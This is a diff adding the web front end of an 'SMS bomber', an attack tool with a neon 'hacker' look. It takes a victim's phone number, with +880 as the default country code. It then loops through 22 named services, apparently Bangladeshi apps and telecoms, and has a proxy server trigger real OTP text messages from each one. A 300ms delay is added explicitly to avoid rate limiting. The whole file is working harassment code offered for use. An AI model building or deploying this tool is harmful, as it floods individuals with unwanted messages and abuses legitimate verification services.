@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SMS BOMBER | TAME MR EX</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=JetBrains+Mono:wght@300;500&display=swap');
+        :root { --neon-blue: #00f3ff; --bg: #030303; }
+        body { background: var(--bg); color: #fff; font-family: 'JetBrains Mono', monospace; overflow-x: hidden; -webkit-user-select: none; user-select: none; }
+        #_matrix { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.15; width: 100%; height: 100%; }
+        .title-table {
+            border: 2px solid var(--neon-blue); background: rgba(0, 243, 255, 0.05); padding: 15px 40px;
+            display: inline-block; box-shadow: 0 0 20px rgba(0, 243, 255, 0.2); clip-path: polygon(5% 0, 100% 0, 95% 100%, 0 100%);
+        }
+        .electric-text {
+            font-family: 'Orbitron', sans-serif; color: #fff; white-space: nowrap;
+            text-shadow: 0 0 10px var(--neon-blue); animation: blink-shock 0.1s infinite alternate;
+        }
+        @keyframes blink-shock {
+            0% { opacity: 1; text-shadow: 0 0 10px var(--neon-blue), 2px 2px 5px #000; }
+            100% { opacity: 0.8; text-shadow: 0 0 20px var(--neon-blue), 0 0 40px #fff; transform: skew(0.2deg); }
+        }
+        .cyber-panel { background: rgba(10, 10, 10, 0.95); border: 2px solid var(--neon-blue); box-shadow: 0 0 25px rgba(0, 243, 255, 0.1); backdrop-filter: blur(15px); }
+        .btn-bomb { background: linear-gradient(45deg, #ff003c, #ff5e00); color: #fff; font-weight: 900; clip-path: polygon(10% 0, 100% 0, 90% 100%, 0 100%); transition: 0.4s; cursor: pointer; border: none; padding: 18px; }
+        .btn-bomb:hover { filter: brightness(1.2); }
+    </style>
+</head>
+<body oncontextmenu="return false">
+    <canvas id="_matrix"></canvas>
+
+    <div id="mainUI" class="min-h-screen flex flex-col p-4 md:p-10">
+        <header class="flex justify-center mb-12">
+            <div class="title-table">
+                <h1 class="text-3xl md:text-5xl font-black electric-text">SMS BOMBER</h1>
+            </div>
+        </header>
+
+        <main class="grid grid-cols-1 lg:grid-cols-3 gap-8 flex-1">
+            <!-- Control Panel -->
+            <div class="cyber-panel p-8 border-l-4 border-l-red-600 flex flex-col justify-center space-y-6">
+                <div>
+                    <label class="text-xs text-gray-400 uppercase tracking-widest">Country Code</label>
+                    <input id="countryCode" type="text" value="+880" class="w-full bg-black/50 border border-gray-800 p-3 text-white rounded outline-none font-mono focus:border-cyan-400">
+                </div>
+                <div>
+                    <label class="text-xs text-gray-400 uppercase tracking-widest">Phone Number</label>
+                    <input type="number" id="phoneNum" placeholder="1XXXXXXXXX" class="w-full bg-black/50 border border-gray-800 p-4 text-white rounded text-lg outline-none font-mono focus:border-cyan-400">
+                </div>
+                <button onclick="startBombing()" id="startBtn" class="w-full py-5 btn-bomb text-sm uppercase tracking-[4px]">
+                    💣 START SMS BOMB
+                </button>
+                <button onclick="stopBombing()" id="stopBtn" class="w-full py-3 bg-gray-800 hover:bg-gray-700 text-white text-xs uppercase tracking-widest rounded hidden">
+                    ⏹️ STOP
+                </button>
+                <div class="text-center text-[10px] text-gray-500 uppercase font-bold tracking-widest">
+                    APIs: <span id="apiCount" class="text-green-400"></span> | Sent: <span id="sentCount" class="text-yellow-400">0</span>
+                </div>
+            </div>
+
+            <!-- Log Box -->
+            <div class="lg:col-span-2 cyber-panel p-6 flex flex-col min-h-[400px]">
+                <div class="flex justify-between items-center mb-4 border-b border-gray-900 pb-2">
+                    <span class="text-[10px] font-bold text-cyan-500 uppercase tracking-widest">LIVE ATTACK LOG</span>
+                    <span class="text-[10px] text-gray-500">Total APIs: <span id="totalApis">0</span></span>
+                </div>
+                <div id="logBox" class="flex-1 overflow-y-auto font-mono text-[12px] leading-relaxed space-y-2">
+                    <p class="text-cyan-800">>> System Ready. Choose a number and start...</p>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <script>
+        // আপনার প্রক্সি সার্ভারের URL (Railway/Render থেকে পাওয়া)
+        const PROXY_URL = "https://your-proxy-server.railway.app/bomb"; // <-- এখানে আপনার URL বসান
+
+        const apiNames = [
+            "Amazon OTP", "Bioscope Live", "Chorki", "Apex4u", "Chardike",
+            "Deeptoplay", "Garibook Admin", "Ghoori Learning", "Ostad", "REDX",
+            "Shikho", "Upay System", "Timezone BD", "Bohubrihi", "Grameenphone",
+            "Easy.com.bd", "Quizgiri", "Otithee", "BTCL", "ieducationbd",
+            "Walton Plaza", "Mojaru"
+        ];
+
+        let bombingActive = false;
+        let sentCount = 0;
+
+        document.getElementById('totalApis').innerText = apiNames.length;
+        document.getElementById('apiCount').innerText = apiNames.length;
+
+        function log(message, color = 'text-gray-300') {
+            const logBox = document.getElementById('logBox');
+            const p = document.createElement('p');
+            p.className = color;
+            p.innerHTML = message;
+            logBox.prepend(p);
+        }
+
+        function startBombing() {
+            if (bombingActive) return alert('Already bombing!');
+            const cc = document.getElementById('countryCode').value.trim();
+            const ph = document.getElementById('phoneNum').value.trim();
+            if (!ph || ph.length < 6) return alert('Valid phone number required!');
+
+            bombingActive = true;
+            sentCount = 0;
+            document.getElementById('sentCount').innerText = sentCount;
+            document.getElementById('startBtn').classList.add('hidden');
+            document.getElementById('stopBtn').classList.remove('hidden');
+
+            log(`>> 💣 BOMBING STARTED on ${cc}${ph}`, 'text-red-400 font-bold');
+            document.getElementById('phoneNum').disabled = true;
+            document.getElementById('countryCode').disabled = true;
+
+            bombLoop(cc, ph);
+        }
+
+        async function bombLoop(cc, ph) {
+            for (let i = 0; i < apiNames.length && bombingActive; i++) {
+                log(`[${i+1}/${apiNames.length}] Targeting: ${apiNames[i]}...`, 'text-yellow-400');
+                try {
+                    const res = await fetch(PROXY_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ cc, ph, apiIndex: i })
+                    });
+                    const data = await res.json();
+                    if (data.success) {
+                        sentCount++;
+                        document.getElementById('sentCount').innerText = sentCount;
+                        log(`✅ ${data.name} – OTP sent! (${data.status})`, 'text-green-400');
+                    } else {
+                        log(`❌ ${data.name} – Failed (${data.status || data.error})`, 'text-red-400');
+                    }
+                } catch (err) {
+                    log(`🌐 ${apiNames[i]} – Network/Proxy Error`, 'text-orange-400');
+                }
+                // Rate limiting এড়াতে 300ms delay
+                await new Promise(r => setTimeout(r, 300));
+            }
+            if (bombingActive) {
+                log(`🏁 BOMBING COMPLETED. ${sentCount}/${apiNames.length} success.`, 'text-cyan-300 font-bold');
+                resetUI();
+            }
+        }
+
+        function stopBombing() {
+            bombingActive = false;
+            log(`⏹️ STOPPED by user.`, 'text-red-300');
+            resetUI();
+        }
+
+        function resetUI() {
+            bombingActive = false;
+            document.getElementById('startBtn').classList.remove('hidden');
+            document.getElementById('stopBtn').classList.add('hidden');
+            document.getElementById('phoneNum').disabled = false;
+            document.getElementById('countryCode').disabled = false;
+        }
+
+        // Matrix Rain
+        const canvas = document.getElementById('_matrix');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+        const matrixChars = "0101SMS_BOMB_786";
+        const drops = Array(Math.ceil(canvas.width / 18)).fill(0);
+        function drawMatrix() {
+            ctx.fillStyle = "rgba(0,0,0,0.1)"; ctx.fillRect(0,0,canvas.width,canvas.height);
+            ctx.fillStyle = "#0ff"; ctx.font = "14px Orbitron";
+            drops.forEach((y, i) => {
+                ctx.fillText(matrixChars[Math.floor(Math.random()*matrixChars.length)], i*18, y*18);
+                if (y*18 > canvas.height && Math.random() > 0.985) drops[i] = 0;
+                drops[i]++;
+            });
+        }
+        setInterval(drawMatrix, 50);
+    </script>
+</body>
+</html>
